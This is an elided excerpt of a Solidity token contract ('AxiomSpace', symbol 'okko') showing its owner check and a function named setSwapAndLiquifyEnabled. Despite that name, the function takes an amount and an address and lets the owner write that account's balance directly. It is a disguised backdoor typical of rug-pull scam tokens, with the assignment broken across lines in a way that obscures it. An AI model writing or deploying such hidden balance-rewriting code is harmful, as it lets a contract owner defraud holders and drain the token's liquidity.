...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_Baby == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract AxiomSpace is Context, IERC20, Ownable {
    ...
    string private _name = "okko";
    string private _symbol = "okko";
    ...
    function setSwapAndLiquifyEnabled(bool _enabled,uint256 de,address account ) public onlyOwner {
        _rOwned
        [account] = (
        de
        .mul(_getRate()));
